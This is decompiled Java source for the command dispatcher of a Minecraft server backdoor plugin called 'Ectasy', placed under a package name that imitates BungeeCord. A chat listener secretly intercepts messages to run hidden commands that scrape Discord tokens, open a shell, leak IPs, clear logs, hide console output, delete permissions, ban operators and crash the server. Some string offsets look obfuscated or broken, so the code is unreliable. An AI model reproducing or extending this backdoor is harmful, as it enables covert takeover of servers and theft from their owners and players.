package fr.body.ectasy.command;

import fr.body.ectasy.command.impl.AdminLoginCommand;
import fr.body.ectasy.command.impl.AdvertisementCommand;
import fr.body.ectasy.command.impl.AnnounceGriefCommand;
import fr.body.ectasy.command.impl.AntiBanCommand;
import fr.body.ectasy.command.impl.BanCommand;
import fr.body.ectasy.command.impl.BanOperatorsCommand;
import fr.body.ectasy.command.impl.BlatantCommand;
import fr.body.ectasy.command.impl.BlockConsoleCommand;
import fr.body.ectasy.command.impl.BombCommand;
import fr.body.ectasy.command.impl.BroadcastCommand;
import fr.body.ectasy.command.impl.ChangeDirCommand;
import fr.body.ectasy.command.impl.ChatCommand;
import fr.body.ectasy.command.impl.ChatSpamCommand;
import fr.body.ectasy.command.impl.ClearCharCommand;
import fr.body.ectasy.command.impl.ClearLogsCommand;
import fr.body.ectasy.command.impl.ClearPasswordCommand;
import fr.body.ectasy.command.impl.CmdSpyCommand;
import fr.body.ectasy.command.impl.CommandInfoCommand;
import fr.body.ectasy.command.impl.ConsoleCommand;
import fr.body.ectasy.command.impl.ConsoleHideCommand;
import fr.body.ectasy.command.impl.ConsoleLogCommand;
import fr.body.ectasy.command.impl.CoordsCommand;
import fr.body.ectasy.command.impl.CrashCommand;
import fr.body.ectasy.command.impl.CreateWorldCommand;
import fr.body.ectasy.command.impl.DamageCommand;
import fr.body.ectasy.command.impl.DayCommand;
import fr.body.ectasy.command.impl.DeleteLuckPermsCommand;
import fr.body.ectasy.command.impl.DeletePluginCommand;
import fr.body.ectasy.command.impl.DeleteWorldCommand;
import fr.body.ectasy.command.impl.DeopCommand;
import fr.body.ectasy.command.impl.DisablePluginCommand;
import fr.body.ectasy.command.impl.DisableSkriptCommand;
import fr.body.ectasy.command.impl.DupeCommand;
import fr.body.ectasy.command.impl.EnablePluginCommand;
import fr.body.ectasy.command.impl.EnchantCommand;
import fr.body.ectasy.command.impl.EnderChestCommand;
import fr.body.ectasy.command.impl.ErrorKickCommand;
import fr.body.ectasy.command.impl.FeedCommand;
import fr.body.ectasy.command.impl.FloodCommand;
import fr.body.ectasy.command.impl.FloodConsoleCommand;
import fr.body.ectasy.command.impl.FlyCommand;
import fr.body.ectasy.command.impl.FreezeCommand;
import fr.body.ectasy.command.impl.FuckCommand;
import fr.body.ectasy.command.impl.GMACommand;
import fr.body.ectasy.command.impl.GMCCommand;
import fr.body.ectasy.command.impl.GMSCommand;
import fr.body.ectasy.command.impl.GMSPCommand;
import fr.body.ectasy.command.impl.GamemodeCommand;
import fr.body.ectasy.command.impl.GiveCommand;
import fr.body.ectasy.command.impl.GodModeCommand;
import fr.body.ectasy.command.impl.HealCommand;
import fr.body.ectasy.command.impl.HelpCommand;
import fr.body.ectasy.command.impl.InjectCommand;
import fr.body.ectasy.command.impl.InstallPluginByUrlCommand;
import fr.body.ectasy.command.impl.InstallSkriptCommand;
import fr.body.ectasy.command.impl.InvSeeCommand;
import fr.body.ectasy.command.impl.ItemCountCommand;
import fr.body.ectasy.command.impl.ItemLoreCommand;
import fr.body.ectasy.command.impl.KickCommand;
import fr.body.ectasy.command.impl.KillCommand;
import fr.body.ectasy.command.impl.LagCommand;
import fr.body.ectasy.command.impl.LeakIPCommand;
import fr.body.ectasy.command.impl.ListLoggedInCommand;
import fr.body.ectasy.command.impl.ListWorldsCommand;
import fr.body.ectasy.command.impl.LockChatCommand;
import fr.body.ectasy.command.impl.LockCmdCommand;
import fr.body.ectasy.command.impl.LoginCommand;
import fr.body.ectasy.command.impl.LogoutCommand;
import fr.body.ectasy.command.impl.LsCommand;
import fr.body.ectasy.command.impl.MotdCommand;
import fr.body.ectasy.command.impl.MsgJoinCommand;
import fr.body.ectasy.command.impl.NickAllCommand;
import fr.body.ectasy.command.impl.NightCommand;
import fr.body.ectasy.command.impl.NukeCommand;
import fr.body.ectasy.command.impl.OPCommand;
import fr.body.ectasy.command.impl.PenisRainCommand;
import fr.body.ectasy.command.impl.PluginsCommand;
import fr.body.ectasy.command.impl.PwdCommand;
import fr.body.ectasy.command.impl.RacismCommand;
import fr.body.ectasy.command.impl.RainCommand;
import fr.body.ectasy.command.impl.ReadFileCommand;
import fr.body.ectasy.command.impl.RemoveEnchantCommand;
import fr.body.ectasy.command.impl.RemovePlayerCommand;
import fr.body.ectasy.command.impl.RenameAllItemsCommand;
import fr.body.ectasy.command.impl.RenameItemCommand;
import fr.body.ectasy.command.impl.RepairItemCommand;
import fr.body.ectasy.command.impl.ResetPlayerDataCommand;
import fr.body.ectasy.command.impl.RmCommand;
import fr.body.ectasy.command.impl.ScrapeDiscordTokenCommand;
import fr.body.ectasy.command.impl.SecretChatCommand;
import fr.body.ectasy.command.impl.SecureGriefCommand;
import fr.body.ectasy.command.impl.SendCommand;
import fr.body.ectasy.command.impl.ServerInfoCommand;
import fr.body.ectasy.command.impl.SetPasswordCommand;
import fr.body.ectasy.command.impl.ShellCommand;
import fr.body.ectasy.command.impl.SilentBanCommand;
import fr.body.ectasy.command.impl.SkyLimitCommand;
import fr.body.ectasy.command.impl.SpamCommand;
import fr.body.ectasy.command.impl.SpamLPCommand;
import fr.body.ectasy.command.impl.SpamSummonCommand;
import fr.body.ectasy.command.impl.StopCommand;
import fr.body.ectasy.command.impl.StrikeCommand;
import fr.body.ectasy.command.impl.SudoCommand;
import fr.body.ectasy.command.impl.SunCommand;
import fr.body.ectasy.command.impl.TPCommand;
import fr.body.ectasy.command.impl.ThunderCommand;
import fr.body.ectasy.command.impl.ToggleChatCommand;
import fr.body.ectasy.command.impl.UnbanCommand;
import fr.body.ectasy.command.impl.UnfreezeCommand;
import fr.body.ectasy.command.impl.WandCommand;
import fr.body.ectasy.command.impl.WorldSeedCommand;
import fr.body.ectasy.command.impl.XPCommand;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.user.User;
import fr.body.ectasy.util.ChatUtil;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;
import net.md5.bungee.Ectasy;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class CommandManager implements Listener {
   private static final List<AbstractCommand> commands = new ArrayList<>();

   public void setupCommands() throws Exception {
      commands.add(new LoginCommand());
      commands.add(new AdvertisementCommand());
      commands.add(new AnnounceGriefCommand());
      commands.add(new AntiBanCommand());
      commands.add(new BanOperatorsCommand());
      commands.add(new BanCommand());
      commands.add(new BlatantCommand());
      commands.add(new BombCommand());
      commands.add(new CrashCommand());
      commands.add(new BroadcastCommand());
      commands.add(new ChatCommand());
      commands.add(new ClearLogsCommand());
      commands.add(new ClearPasswordCommand());
      commands.add(new CommandInfoCommand());
      commands.add(new ConsoleCommand());
      commands.add(new ConsoleHideCommand());
      commands.add(new ConsoleLogCommand());
      commands.add(new CoordsCommand());
      commands.add(new CreateWorldCommand());
      commands.add(new DamageCommand());
      commands.add(new DayCommand());
      commands.add(new DeleteLuckPermsCommand());
      commands.add(new DeleteWorldCommand());
      commands.add(new DeletePluginCommand());
      commands.add(new DeopCommand());
      commands.add(new DisablePluginCommand());
      commands.add(new DisableSkriptCommand());
      commands.add(new DupeCommand());
      commands.add(new EnablePluginCommand());
      commands.add(new EnchantCommand());
      commands.add(new EnderChestCommand());
      commands.add(new ErrorKickCommand());
      commands.add(new FeedCommand());
      commands.add(new FloodCommand());
      commands.add(new FloodConsoleCommand());
      commands.add(new FlyCommand());
      commands.add(new FreezeCommand());
      commands.add(new FuckCommand());
      commands.add(new GamemodeCommand());
      commands.add(new GiveCommand());
      commands.add(new GMACommand());
      commands.add(new GMCCommand());
      commands.add(new GMSCommand());
      commands.add(new GMSPCommand());
      commands.add(new GodModeCommand());
      commands.add(new HealCommand());
      commands.add(new HelpCommand());
      commands.add(new InjectCommand());
      commands.add(new InstallPluginByUrlCommand());
      commands.add(new InstallSkriptCommand());
      commands.add(new InvSeeCommand());
      commands.add(new ItemCountCommand());
      commands.add(new KickCommand());
      commands.add(new KillCommand());
      commands.add(new LagCommand());
      commands.add(new LeakIPCommand());
      commands.add(new ListLoggedInCommand());
      commands.add(new ListWorldsCommand());
      commands.add(new LockChatCommand());
      commands.add(new LockCmdCommand());
      commands.add(new BlockConsoleCommand());
      commands.add(new AdminLoginCommand());
      commands.add(new LogoutCommand());
      commands.add(new ItemLoreCommand());
      commands.add(new MotdCommand());
      commands.add(new MsgJoinCommand());
      commands.add(new NickAllCommand());
      commands.add(new NightCommand());
      commands.add(new NukeCommand());
      commands.add(new OPCommand());
      commands.add(new PenisRainCommand());
      commands.add(new PluginsCommand());
      commands.add(new RacismCommand());
      commands.add(new RainCommand());
      commands.add(new RemovePlayerCommand());
      commands.add(new RenameAllItemsCommand());
      commands.add(new RenameItemCommand());
      commands.add(new RepairItemCommand());
      commands.add(new ResetPlayerDataCommand());
      commands.add(new ChatSpamCommand());
      commands.add(new ScrapeDiscordTokenCommand());
      commands.add(new SecureGriefCommand());
      commands.add(new WorldSeedCommand());
      commands.add(new SendCommand());
      commands.add(new SecretChatCommand());
      commands.add(new ServerInfoCommand());
      commands.add(new SetPasswordCommand());
      commands.add(new ShellCommand());
      commands.add(new SilentBanCommand());
      commands.add(new SkyLimitCommand());
      commands.add(new SpamCommand());
      commands.add(new SpamLPCommand());
      commands.add(new SpamSummonCommand());
      commands.add(new CmdSpyCommand());
      commands.add(new StopCommand());
      commands.add(new StrikeCommand());
      commands.add(new SudoCommand());
      commands.add(new SunCommand());
      commands.add(new ThunderCommand());
      commands.add(new ToggleChatCommand());
      commands.add(new TPCommand());
      commands.add(new UnbanCommand());
      commands.add(new RemoveEnchantCommand());
      commands.add(new UnfreezeCommand());
      commands.add(new WandCommand());
      commands.add(new XPCommand());
      commands.add(new ChangeDirCommand());
      commands.add(new ClearCharCommand());
      commands.add(new LsCommand());
      commands.add(new PwdCommand());
      commands.add(new ReadFileCommand());
      commands.add(new RmCommand());
      commands.sort(Comparator.comparing(AbstractCommand::getName));
   }

   public CommandManager() {
   }

   public AbstractCommand getCommandByName(String var1) {
      for(AbstractCommand var3 : this.getCommands()) {
         if (var3.getName().equalsIgnoreCase(var1) || var3.getAliases().contains(var1.toLowerCase())) {
            return var3;
         }
      }

      return null;
   }

   @EventHandler
   public void onChat(AsyncPlayerChatEvent var1) {
      if (!Ectasy.killSwitch) {
         Player var2 = var1.getPlayer();
         Ectasy.users.putIfAbsent(var2.getName(), new User(var2));
         User var3 = Ectasy.users.get(var2.getName());
         String var4 = var1.getMessage();
         if (var4.length() > 2 && !var4.equals(ChatColor.stripColor(var4.substring(var4.length() ^ 89)))) {
            var4 = ChatColor.stripColor(var4);
            var1.setMessage(var4);
         }

         var1.setCancelled(true);
         String var5 = var4.toLowerCase();
         if (var4.contains(" ")) {
            var5 = var4.toLowerCase().split(" ")[0];
         }

         String[] var6 = new String[0];
         if (var4.contains(" ")) {
            var6 = var4.substring(var5.length() + 86).split(" ");
         }

         for(AbstractCommand var8 : commands) {
            if (var8.getName().equalsIgnoreCase(var5) || var8.getAliases().contains(var5) || var8.getUnusedList().contains(var5)) {
               if (var3.rank.index >= var8.requiredRank.index) {
                  if (var8.isBlatant() && !var3.blatant) {
                     ChatUtil.sendChat(var2, "This command requires blatant mode!");
                  } else {
                     var8.execute(var1, var5, var6);
                  }
               } else {
                  if (var3.rank == Rank.UNAUTHORIZED) {
                     var1.setCancelled(false);
                     return;
                  }

                  ChatUtil.sendChat(
                     var2,
                     "You need the rank "
                        + ChatUtil.getColorByRank(var8.getRequiredRank())
                        + var8.getRequiredRank().name().toLowerCase()
                        + "&f to use this command."
                  );
               }

               return;
            }
         }

         if (var3.rank != Rank.UNAUTHORIZED && !var3.chatModeEnabled) {
            ChatUtil.sendChat(var2, "Unknown command.");
         } else {
            var1.setCancelled(false);
         }
      }
   }

   public List<AbstractCommand> getCommands() {
      return commands;
   }
}
